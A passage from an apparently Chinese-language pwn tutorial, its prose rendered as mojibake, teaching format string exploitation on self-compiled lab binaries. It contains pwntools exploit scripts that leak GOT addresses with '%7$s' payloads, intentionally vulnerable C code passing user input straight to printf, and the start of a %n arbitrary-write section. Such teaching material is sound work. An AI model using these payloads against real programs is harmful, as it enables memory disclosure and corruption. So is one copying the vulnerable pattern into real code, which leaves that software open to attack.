<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">00:0000â”‚ esp 0xff912470
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¡¨ç¤ºå½“å‰æ ˆé¡¶æŒ‡é’ˆ <code>esp</code> æŒ‡å‘çš„å†…å­˜åœ°å€æ˜¯ <code>0xff912470</code>ï¼ˆæ ˆé¡¶çš„ç¬¬ä¸€ä¸ªä½ç½®ï¼‰ï¼Œè¿™æ˜¯æ ˆä¸Šçš„ä¸€ä¸ªåœ°å€ã€‚</p>
<ol start="2">
<li>ç¬¬äºŒå±‚ï¼š<strong>0xff912470</strong> ä¸­å­˜å‚¨çš„å†…å®¹</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0xff912470 â€”â–¸ 0xff91248c
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ°å€ <strong>0xff912470</strong> é‡Œå­˜æ”¾çš„æ•°æ®æ˜¯å¦ä¸€ä¸ªåœ°å€ <strong>0xff91248c</strong>ï¼ˆç®­å¤´ â€œâ€”â–¸â€ è¡¨ç¤º â€œæŒ‡å‘â€ï¼‰ã€‚</p>
<p>ç»“åˆåœºæ™¯ï¼Œ<code>0xff91248c</code> æ˜¯ä½ è¾“å…¥çš„æ ¼å¼åŒ–å­—ç¬¦ä¸² <code>buf</code> çš„å†…å­˜åœ°å€ï¼ˆå¯æ§çš„è¾“å…¥ç¼“å†²åŒºï¼‰ã€‚</p>
<ol start="3">
<li>ç¬¬ä¸‰å±‚ï¼š<strong>0xff91248c</strong> ä¸­å­˜å‚¨çš„å†…å®¹</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0xff91248c â€”â–¸ 0x804a00c (_GLOBAL_OFFSET_TABLE_+12)
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½ çš„è¾“å…¥ç¼“å†²åŒº <strong>0xff91248c</strong> é‡Œå­˜æ”¾çš„æ•°æ®æ˜¯ <strong>0x804a00c</strong>ï¼Œè¿™ä¸ªåœ°å€å±äºç¨‹åºçš„ <strong>GOT è¡¨ï¼ˆå…¨å±€åç§»è¡¨ï¼‰</strong>ï¼Œå…·ä½“æ˜¯ <code>_GLOBAL_OFFSET_TABLE_</code> èµ·å§‹åœ°å€ + 12 å­—èŠ‚çš„ä½ç½®ï¼ˆGOT è¡¨ç”¨äºå­˜å‚¨åŠ¨æ€é“¾æ¥å‡½æ•°çš„çœŸå®åœ°å€ï¼‰ã€‚</p>
<ol start="4">
<li>ç¬¬å››å±‚ï¼š<strong>0x804a00c</strong> ä¸­å­˜å‚¨çš„å†…å®¹</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x804a00c â€”â–¸ 0x8048356 (printf@plt+6)
</span></span></code></pre></td></tr></table>
</div>
</div><p>GOT è¡¨ä¸­çš„ <strong>0x804a00c</strong> é‡Œå­˜æ”¾çš„æ•°æ®æ˜¯ <strong>0x8048356</strong>ï¼Œè¿™ä¸ªåœ°å€å±äºç¨‹åºçš„ <strong>PLT è¡¨ï¼ˆè¿‡ç¨‹é“¾æ¥è¡¨ï¼‰</strong>ï¼Œå…·ä½“æ˜¯ <code>printf</code> å‡½æ•°çš„ PLT è¡¨å…¥å£ + 6 å­—èŠ‚çš„ä½ç½®ï¼ˆPLT è¡¨æ˜¯åŠ¨æ€é“¾æ¥çš„ â€œè·³æ¿â€ï¼Œç”¨äºé—´æ¥è°ƒç”¨åŠ¨æ€å‡½æ•°ï¼‰ã€‚</p>
<ol start="5">
<li>æœ€ç»ˆå†…å®¹ï¼š<strong>0x8048356</strong> å¤„çš„æŒ‡ä»¤</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x8048356 (printf@plt+6) â—‚â€” push 0 /* &#39;h&#39; */
</span></span></code></pre></td></tr></table>
</div>
</div><p>PLT è¡¨åœ°å€ <strong>0x8048356</strong> å¤„å­˜æ”¾çš„æ˜¯ä¸€æ¡å…·ä½“çš„æ±‡ç¼–æŒ‡ä»¤ï¼š<code>push 0</code>ï¼ˆå°†ç«‹å³æ•° 0 å‹å…¥æ ˆï¼‰ã€‚è¿™æ¡æŒ‡ä»¤æ˜¯ <code>printf</code> å‡½æ•°åŠ¨æ€é“¾æ¥è¿‡ç¨‹ä¸­çš„ä¸€éƒ¨åˆ†ï¼ˆç”¨äºè§¦å‘åŠ¨æ€é“¾æ¥å™¨è§£æçœŸå®åœ°å€ï¼‰ã€‚</p>
</blockquote></blockquote>
<p>è¿™é‡Œå°±ä¼šæƒ³åˆ°ä¸ºä»€ä¹ˆæ˜¯è¦<strong>fmtarg 0xff91248c</strong>ï¼Ÿæˆ‘ä»¬è¿™ä¸ªç¬¬äºŒç§æ–¹æ³•æ˜¯è¦åç»­åˆ©ç”¨æ¼æ´å»æ³„éœ²ç¨‹åºå†…<strong>ä»»æ„åœ°å€</strong>ï¼Œè€Œ0xffa50c2cæ˜¯å­˜å‚¨ç€ç¨‹åºçš„ GOT è¡¨ï¼ˆå…¨å±€åç§»è¡¨ï¼‰çš„ã€‚</p>
<p><img src="/p/pwn-3/8.png"
	width="1344"
	height="344"
	srcset="/p/pwn-3/8_hu_cab365c3c576cf10.png 480w, /p/pwn-3/8_hu_949b927b86dd87a1.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="390"
		data-flex-basis="937px"
	
></p>
<p>ï¼ˆ0xff91248cï¼‰åœ¨æ ˆä¸Šçš„å‚æ•°ä½ç½®æ˜¯ç¬¬ 7 ä¸ªï¼Œåœ¨è¿™é‡Œçš„eaxåé¢å°±èƒ½çœ‹åˆ°è¿™ä¸ª0xff91248cäº†ã€‚é‚£æˆ‘ä»¬ç”¨<code>%7$s</code>æˆ–è€…<code>%7$p</code>å°±èƒ½è®¿é—®åˆ°è¿™ä¸ªåœ°å€çš„å†…å®¹äº†ã€‚</p>
<p>æ”¹expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./fmt_32&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span><span class="s2">&#34;b *0x80484F4</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span><span class="c1">#b:break(æ–­ç‚¹)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s1">&#39;%7$s&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>p32(elf.got['gets'])</code> ä¼šå°† <code>gets@got</code> åœ°å€å†™å…¥è¾“å…¥ç¼“å†²åŒº <code>0xff91248c</code>ï¼Œæ¥ç€<code>%7$p</code> ä¼šå‘Šè¯‰ printfï¼šâ€œè¯»å–æ ˆä¸Šç¬¬ 7 ä¸ªå‚æ•°ä½ç½®æŒ‡å‘çš„å†…å®¹â€ï¼Œprintfå°±ä¼šè¾“å‡ºè¿™ä¸ªå‡½æ•°çš„<code>got</code>åœ°å€ã€‚</p>
<p><img src="/p/pwn-3/9.png"
	width="1918"
	height="878"
	srcset="/p/pwn-3/9_hu_7b9a57d801410ca5.png 480w, /p/pwn-3/9_hu_3dca8b4790b0bfc7.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°åœ°å€ï¼ˆgets@gotï¼‰æ³„éœ²äº†ï¼ˆctfshowè™šæ‹Ÿæœºå¥½åƒåäº†ï¼Œæˆ‘æ¢äº†å°24.04çš„ï¼Œæºç å’Œexpæ²¡æ”¹ä¸å½±å“ï¼Œä½†gdbçš„debugä¸ä¼šæ‰“å°å‡ºåœ°å€å°±å¾ˆå¥‡æ€ª&hellip;ï¼‰</p>
<h4 id="64ä½">64ä½
</h4><p>ä¸Šé¢æ˜¯32ä½çš„æ¼”ç¤ºæ¡ˆä¾‹ï¼Œæ¥ä¸‹æ¥çœ‹çœ‹64ä½æœ‰ä»€ä¹ˆä¸åŒï¼Ÿ</p>
<p>ç¼–è¯‘ç›¸åŒCæºä»£ç ï¼š <a class="link" href="fmt_64" >fmt_64</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span> 
</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc fmt.c -o fmt_64 -g -m64 -no-pie
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¼–å†™expéƒ½å·®ä¸å¤šï¼Œåœ°å€è®°å¾—æ”¹ï¼š</p>
<p><img src="/p/pwn-3/10.png"
	width="865"
	height="161"
	srcset="/p/pwn-3/10_hu_27a9fbba99c182bd.png 480w, /p/pwn-3/10_hu_36f4c96f4edc15a3.png 1024w"
	loading="lazy"
	
		alt="call _printfåœ°å€:0x4005DB"
	
	
		class="gallery-image" 
		data-flex-grow="537"
		data-flex-basis="1289px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_64&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./fmt_64&#39;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x4005DB</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;%7$s&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯ï¼š</p>
<p><img src="/p/pwn-3/11.png"
	width="1918"
	height="878"
	srcset="/p/pwn-3/11_hu_8ab969c79c69cb81.png 480w, /p/pwn-3/11_hu_b65781a1c5b3956b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>å¯ä»¥å‘ç°å•¥ä¹Ÿæ²¡æ³„éœ²&hellip;</p>
<blockquote class="alert alert-error">
    <blockquote>
<p><code>p64(elf.got['gets'])</code> æ‰“åŒ…çš„æ˜¯ 64 ä½åœ°å€ï¼ˆå¦‚ <code>0x601028</code>ï¼‰ï¼Œå…¶å­—èŠ‚æµä¸º <code>0x28 0x10 0x60 0x00 0x00 0x00 0x00 0x00</code>ï¼ˆå°ç«¯åºï¼‰ï¼Œç¡®å®åŒ…å«å¤šä¸ª <code>0x00</code> å­—èŠ‚ï¼ˆç©ºå­—ç¬¦ï¼‰ã€‚</p>
</blockquote></blockquote>
<p>å› æ­¤éœ€è¦è°ƒæ¢ä½ç½®ï¼Œ<strong>payload = b&rsquo;%7$s&rsquo; + p64(elf.got[&lsquo;gets&rsquo;])</strong></p>
<p><img src="/p/pwn-3/12.png"
	width="1854"
	height="328"
	srcset="/p/pwn-3/12_hu_7a6f2dfd860178e5.png 480w, /p/pwn-3/12_hu_bcb2a2a40e100ec3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="565"
		data-flex-basis="1356px"
	
></p>
<p>ï¼Ÿï¼Ÿçˆ†nullï¼Ÿè¿˜ä¸è¡Œï¼Œé”™ï¼ï¼ï¼è¿˜ç¼ºäº†å››ä¸ªå­—èŠ‚ï¼Œè¿™å¯æ˜¯64ä½ç¨‹åºå•Šï¼Œä½ b&rsquo;%7$s&rsquo;æ‰4ä¸ªå­—èŠ‚ï¼Œä¸æˆ8å­—èŠ‚ä¸€ä¸ªå•ä½è®·ã€‚</p>
<p>å› æ­¤expï¼ˆ<code>b'%7$sAAAA'</code>åˆšå¥½8å­—èŠ‚ï¼‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./fmt_64&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./fmt_64&#39;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="s2">&#34;b *0x4005DB</span><span class="se">\n</span><span class="s2">c&#34;</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%7$sAAAA&#39;</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/pwn-3/13.png"
	width="1918"
	height="878"
	srcset="/p/pwn-3/13_hu_33dc14dafbc1cad.png 480w, /p/pwn-3/13_hu_28791b40fafafb5a.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="524px"
	
></p>
<p>æˆ‘ä»¬åªéœ€è¦æŠŠå‰é¢çš„AAAAå»æ‰å°±æ˜¯çº¯å‡€çš„æ‰€éœ€åœ°å€äº†ã€‚</p>
<h4 id="ç¨‹åºäº¤äº’æ¼”ç¤º">ç¨‹åºäº¤äº’æ¼”ç¤º
</h4><p>ä»¥32ä½ç¨‹åºä½œä¸ºä¾‹å­ï¼š <a class="link" href="fmt_32" >fmt_32</a></p>
<p>è¿™æ¬¡æˆ‘ä»¬ä¸ç”¨gdbè°ƒè¯•äº†ï¼Œæœ¬åœ°è¿è¡Œè¿™ä¸ªç¨‹åºæ–‡ä»¶ï¼Œè¿›ä¸€æ­¥æŸ¥çœ‹åœ¨ç¨‹åºäº¤äº’ä¸Šåˆ©ç”¨printfæ¥æ³„éœ²çš„åŸç†ï¼š</p>
<p>è¾“å…¥ï¼š<strong>AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</strong>ï¼ˆ64ä½å°±æ”¹æˆAAAAAAAAï¼Œå…¶å®ä»€ä¹ˆå­—æ¯éƒ½å¯ä»¥ï¼Œåªæ˜¯æ–¹ä¾¿åšæ ‡è®°è€Œå·²ğŸ˜„ï¼Œå­—æ¯Açš„ASCIIæ˜¯0x41ï¼‰</p>
<p><img src="/p/pwn-3/14.png"
	width="1829"
	height="174"
	srcset="/p/pwn-3/14_hu_a32b8fc21909411.png 480w, /p/pwn-3/14_hu_8cb51cae5b4a3719.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="1051"
		data-flex-basis="2522px"
	
>ä»è¾“å‡ºç»“æœæ¥çœ‹ï¼Œ<code>0x41414141</code>ï¼ˆå³æˆ‘è¾“å…¥çš„ <code>AAAA</code>ï¼‰å‡ºç°åœ¨ç¬¬ 7 ä¸ª <code>%p</code> çš„ä½ç½®ï¼Œè¿™å’Œä¹‹å‰ä½¿ç”¨ <code>%7$s</code> çš„é€»è¾‘ <strong>å®Œå…¨ä¸€è‡´</strong>ï¼Œæœ¬è´¨ä¸Šæ˜¯åŒä¸€ä¸ªåç§»è®¡ç®—è§„åˆ™ã€‚ï¼ˆè¿™ä¸€ç‚¹å­¦è¿‡Cè¯­è¨€çš„printfå‡½æ•°ç”¨æ³•éƒ½æœ‰æ‰€æ„Ÿæ‚Ÿå§ï¼‰</p>
<p>å…¶å®è¿™ç§æ–¹æ³•å¾ˆå¿«ï¼Œæ¯”ç”¨gdbå¿«å¤šäº†ï¼Œä½†é‡åœ¨ç›²æ³¨ï¼Œä½ ä¸çŸ¥é“è¦å‡ ä¸ª<code>%p</code>ï¼Œgdbçš„åº•å±‚åŸç†å±•ç°çš„æ¯”è¾ƒæ¸…æ™°ï¼Œå¸Œæœ›ä½ èƒ½ç†è§£èƒŒåçš„åŸç†ã€‚</p>
<blockquote class="alert alert-tip">
    <blockquote>
<p>ç»¼ä¸Šæ‰€è¿°ï¼š<code>0x41414141</code> å‡ºç°åœ¨ç¬¬ 7 ä¸ª <code>%p</code> çš„ä½ç½®ï¼Œæ˜¯å› ä¸ºåœ¨ä½ çš„ 32 ä½ç¨‹åºä¸­ï¼Œè¾“å…¥çš„ <code>AAAA</code> è¢«å‹å…¥æ ˆåï¼Œæ°å¥½ä½äºæ ¼å¼åŒ–å­—ç¬¦ä¸²å‚æ•°åˆ—è¡¨çš„ç¬¬ 7 ä¸ªä½ç½®ï¼Œè¿™æ˜¯ç”± 32 ä½ç¨‹åºçš„æ ˆå¸ƒå±€å’Œå‚æ•°è§£æè§„åˆ™å…±åŒå†³å®šçš„ã€‚è¿™ä¸ªåç§»ï¼ˆ7ï¼‰æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹‹å‰ç”¨ <code>%7$s</code> æ—¶ï¼Œåªè¦åœ¨è¯¥ä½ç½®æ”¾å…¥æœ‰æ•ˆåœ°å€ï¼ˆå¦‚ <code>gets@got</code>ï¼‰ï¼Œå°±èƒ½æ­£ç¡®è¯»å–ç›®æ ‡å†…å®¹ã€‚</p>
<p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼šè®¡ç®—å¤„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»â€”â–¸æ³„éœ²æ‰€éœ€å‡½æ•°gotçš„åœ°å€â€”â–¸åç»­æ‰‹æ³•&hellip;</p>
</blockquote></blockquote>
<h2 id="æ•°å­—è¦†ç›–">æ•°å­—è¦†ç›–
</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°ä»‹ç»ï¼š</p>
<p><code>%n</code>ï¼Œä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯ä¼šæŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚ï¼ˆå¦‚æœå‰é¢è¾“å‡ºäº†3ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šæ”¹å˜å¯¹åº”æŒ‡é’ˆçš„å¯¹åº”åœ°å€çš„å€¼æ”¹æˆ3ï¼‰</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>0x8</th>
          <th>0x28</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0x10</td>
          <td>0xFFFF1234</td>
      </tr>
      <tr>
          <td>0x18</td>
          <td>0xFFFF1234</td>
      </tr>
      <tr>
          <td>0x20</td>
          <td>0xFFFF1234</td>
      </tr>
      <tr>
          <td>0x28</td>
          <td>p32(0x80102048)</td>
      </tr>
      <tr>
          <td>0x30</td>
          <td>%xc%4$n</td>
      </tr>
      <tr>
          <td>0x38</td>
          <td>%p%p%p%p</td>
      </tr>
      <tr>
          <td>0x40</td>
          <td>%p%p%p%p</td>
      </tr>
  </tbody>
</table></div>
<p>æ‰§è¡Œäº†<code>%xc%4$n</code>åï¼Œå¾€0x28ä¿®æ”¹æˆ0xXï¼ˆç”±helloâ€”&gt;0xXï¼‰ï¼š</p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th style="text-align: left">0x80102048</th>
          <th>0xX</th>
      </tr>
  </thead>
  <tbody>
  </tbody>
</table></div>
<h3 id="ä»»æ„åœ°å€å†…å­˜è¦†ç›–">ä»»æ„åœ°å€å†…å­˜è¦†ç›–
</h3><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•çŸ¥é“è¦ä¿®æ”¹çš„å˜é‡çš„åœ°å€ã€‚</p>
<p>ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡IDAæŸ¥çœ‹ï¼Œå…¶æ¬¡ï¼Œæˆ‘ä»¬æ¥ç¡®å®šä¸€ä¸‹å­˜å‚¨æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€æ˜¯ printf å°†è¦è¾“å‡ºçš„ç¬¬å‡ ä¸ªå‚æ•°ï¼ˆï¼‰ï¼ŒæŒ‰ç…§ä¸Šä¸€ç« æ‰€è®²çš„ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•è·å–å³å¯ã€‚</p>
<p>æ¥ä¸ªå®ä¾‹çœ‹çœ‹ï¼š</p>
<p>Cæºä»£ç ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x30</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nf">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;2</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>        
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;0xdeadbeef</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">a</span> <span class="o">==</span> <span class="mh">0x30</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;0x30</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
